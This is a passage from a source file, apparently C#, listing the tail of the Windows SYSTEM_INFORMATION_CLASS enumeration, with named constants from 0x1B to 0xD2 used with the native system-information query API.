                SystemUnloadGdiDriverInformation = 0x1B,
                SystemTimeAdjustmentInformation = 0x1C,
                SystemSummaryMemoryInformation = 0x1D,
                SystemMirrorMemoryInformation = 0x1E,
                SystemPerformanceTraceInformation = 0x1F,
                SystemObsolete0 = 0x20,
                SystemExceptionInformation = 0x21,
                SystemCrashDumpStateInformation = 0x22,
                SystemKernelDebuggerInformation = 0x23,
                SystemContextSwitchInformation = 0x24,
                SystemRegistryQuotaInformation = 0x25,
                SystemExtendServiceTableInformation = 0x26,
                SystemPrioritySeperation = 0x27,
                SystemVerifierAddDriverInformation = 0x28,
                SystemVerifierRemoveDriverInformation = 0x29,
                SystemProcessorIdleInformation = 0x2A,
                SystemLegacyDriverInformation = 0x2B,
                SystemCurrentTimeZoneInformation = 0x2C,
                SystemLookasideInformation = 0x2D,
                SystemTimeSlipNotification = 0x2E,
                SystemSessionCreate = 0x2F,
                SystemSessionDetach = 0x30,
                SystemSessionInformation = 0x31,
                SystemRangeStartInformation = 0x32,
                SystemVerifierInformation = 0x33,
                SystemVerifierThunkExtend = 0x34,
                SystemSessionProcessInformation = 0x35,
                SystemLoadGdiDriverInSystemSpace = 0x36,
                SystemNumaProcessorMap = 0x37,
                SystemPrefetcherInformation = 0x38,
                SystemExtendedProcessInformation = 0x39,
                SystemRecommendedSharedDataAlignment = 0x3A,
                SystemComPlusPackage = 0x3B,
                SystemNumaAvailableMemory = 0x3C,
                SystemProcessorPowerInformation = 0x3D,
                SystemEmulationBasicInformation = 0x3E,
                SystemEmulationProcessorInformation = 0x3F,
                SystemExtendedHandleInformation = 0x40,
                SystemLostDelayedWriteInformation = 0x41,
                SystemBigPoolInformation = 0x42,
                SystemSessionPoolTagInformation = 0x43,
                SystemSessionMappedViewInformation = 0x44,
                SystemHotpatchInformation = 0x45,
                SystemObjectSecurityMode = 0x46,
                SystemWatchdogTimerHandler = 0x47,
                SystemWatchdogTimerInformation = 0x48,
                SystemLogicalProcessorInformation = 0x49,
                SystemWow64SharedInformationObsolete = 0x4A,
                SystemRegisterFirmwareTableInformationHandler = 0x4B,
                SystemFirmwareTableInformation = 0x4C,
                SystemModuleInformationEx = 0x4D,
                SystemVerifierTriageInformation = 0x4E,
                SystemSuperfetchInformation = 0x4F,
                SystemMemoryListInformation = 0x50,
                SystemFileCacheInformationEx = 0x51,
                SystemThreadPriorityClientIdInformation = 0x52,
                SystemProcessorIdleCycleTimeInformation = 0x53,
                SystemVerifierCancellationInformation = 0x54,
                SystemProcessorPowerInformationEx = 0x55,
                SystemRefTraceInformation = 0x56,
                SystemSpecialPoolInformation = 0x57,
                SystemProcessIdInformation = 0x58,
                SystemErrorPortInformation = 0x59,
                SystemBootEnvironmentInformation = 0x5A,
                SystemHypervisorInformation = 0x5B,
                SystemVerifierInformationEx = 0x5C,
                SystemTimeZoneInformation = 0x5D,
                SystemImageFileExecutionOptionsInformation = 0x5E,
                SystemCoverageInformation = 0x5F,
                SystemPrefetchPatchInformation = 0x60,
                SystemVerifierFaultsInformation = 0x61,
                SystemSystemPartitionInformation = 0x62,
                SystemSystemDiskInformation = 0x63,
                SystemProcessorPerformanceDistribution = 0x64,
                SystemNumaProximityNodeInformation = 0x65,
                SystemDynamicTimeZoneInformation = 0x66,
                SystemCodeIntegrityInformation = 0x67,
                SystemProcessorMicrocodeUpdateInformation = 0x68,
                SystemProcessorBrandString = 0x69,
                SystemVirtualAddressInformation = 0x6A,
                SystemLogicalProcessorAndGroupInformation = 0x6B,
                SystemProcessorCycleTimeInformation = 0x6C,
                SystemStoreInformation = 0x6D,
                SystemRegistryAppendString = 0x6E,
                SystemAitSamplingValue = 0x6F,
                SystemVhdBootInformation = 0x70,
                SystemCpuQuotaInformation = 0x71,
                SystemNativeBasicInformation = 0x72,
                SystemErrorPortTimeouts = 0x73,
                SystemLowPriorityIoInformation = 0x74,
                SystemBootEntropyInformation = 0x75,
                SystemVerifierCountersInformation = 0x76,
                SystemPagedPoolInformationEx = 0x77,
                SystemSystemPtesInformationEx = 0x78,
                SystemNodeDistanceInformation = 0x79,
                SystemAcpiAuditInformation = 0x7A,
                SystemBasicPerformanceInformation = 0x7B,
                SystemQueryPerformanceCounterInformation = 0x7C,
                SystemSessionBigPoolInformation = 0x7D,
                SystemBootGraphicsInformation = 0x7E,
                SystemScrubPhysicalMemoryInformation = 0x7F,
                SystemBadPageInformation = 0x80,
                SystemProcessorProfileControlArea = 0x81,
                SystemCombinePhysicalMemoryInformation = 0x82,
                SystemEntropyInterruptTimingInformation = 0x83,
                SystemConsoleInformation = 0x84,
                SystemPlatformBinaryInformation = 0x85,
                SystemPolicyInformation = 0x86,
                SystemHypervisorProcessorCountInformation = 0x87,
                SystemDeviceDataInformation = 0x88,
                SystemDeviceDataEnumerationInformation = 0x89,
                SystemMemoryTopologyInformation = 0x8A,
                SystemMemoryChannelInformation = 0x8B,
                SystemBootLogoInformation = 0x8C,
                SystemProcessorPerformanceInformationEx = 0x8D,
                SystemCriticalProcessErrorLogInformation = 0x8E,
                SystemSecureBootPolicyInformation = 0x8F,
                SystemPageFileInformationEx = 0x90,
                SystemSecureBootInformation = 0x91,
                SystemEntropyInterruptTimingRawInformation = 0x92,
                SystemPortableWorkspaceEfiLauncherInformation = 0x93,
                SystemFullProcessInformation = 0x94,
                SystemKernelDebuggerInformationEx = 0x95,
                SystemBootMetadataInformation = 0x96,
                SystemSoftRebootInformation = 0x97,
                SystemElamCertificateInformation = 0x98,
                SystemOfflineDumpConfigInformation = 0x99,
                SystemProcessorFeaturesInformation = 0x9A,
                SystemRegistryReconciliationInformation = 0x9B,
                SystemEdidInformation = 0x9C,
                SystemManufacturingInformation = 0x9D,
                SystemEnergyEstimationConfigInformation = 0x9E,
                SystemHypervisorDetailInformation = 0x9F,
                SystemProcessorCycleStatsInformation = 0xA0,
                SystemVmGenerationCountInformation = 0xA1,
                SystemTrustedPlatformModuleInformation = 0xA2,
                SystemKernelDebuggerFlags = 0xA3,
                SystemCodeIntegrityPolicyInformation = 0xA4,
                SystemIsolatedUserModeInformation = 0xA5,
                SystemHardwareSecurityTestInterfaceResultsInformation = 0xA6,
                SystemSingleModuleInformation = 0xA7,
                SystemAllowedCpuSetsInformation = 0xA8,
                SystemDmaProtectionInformation = 0xA9,
                SystemInterruptCpuSetsInformation = 0xAA,
                SystemSecureBootPolicyFullInformation = 0xAB,
                SystemCodeIntegrityPolicyFullInformation = 0xAC,
                SystemAffinitizedInterruptProcessorInformation = 0xAD,
                SystemRootSiloInformation = 0xAE,
                SystemCpuSetInformation = 0xAF,
                SystemCpuSetTagInformation = 0xB0,
                SystemWin32WerStartCallout = 0xB1,
                SystemSecureKernelProfileInformation = 0xB2,
                SystemCodeIntegrityPlatformManifestInformation = 0xB3,
                SystemInterruptSteeringInformation = 0xB4,
                SystemSuppportedProcessorArchitectures = 0xB5,
                SystemMemoryUsageInformation = 0xB6,
                SystemCodeIntegrityCertificateInformation = 0xB7,
                SystemPhysicalMemoryInformation = 0xB8,
                SystemControlFlowTransition = 0xB9,
                SystemKernelDebuggingAllowed = 0xBA,
                SystemActivityModerationExeState = 0xBB,
                SystemActivityModerationUserSettings = 0xBC,
                SystemCodeIntegrityPoliciesFullInformation = 0xBD,
                SystemCodeIntegrityUnlockInformation = 0xBE,
                SystemIntegrityQuotaInformation = 0xBF,
                SystemFlushInformation = 0xC0,
                SystemProcessorIdleMaskInformation = 0xC1,
                SystemSecureDumpEncryptionInformation = 0xC2,
                SystemWriteConstraintInformation = 0xC3,
                SystemKernelVaShadowInformation = 0xC4,
                SystemHypervisorSharedPageInformation = 0xC5,
                SystemFirmwareBootPerformanceInformation = 0xC6,
                SystemCodeIntegrityVerificationInformation = 0xC7,
                SystemFirmwarePartitionInformation = 0xC8,
                SystemSpeculationControlInformation = 0xC9,
                SystemDmaGuardPolicyInformation = 0xCA,
                SystemEnclaveLaunchControlInformation = 0xCB,
                SystemWorkloadAllowedCpuSetsInformation = 0xCC,
                SystemCodeIntegrityUnlockModeInformation = 0xCD,
                SystemLeapSecondInformation = 0xCE,
                SystemFlags2Information = 0xCF,
                SystemSecurityModelInformation = 0xD0,
                SystemCodeIntegritySyntheticCacheInformation = 0xD1,
                MaxSystemInfoClass = 0xD2

            }

        }
    }
}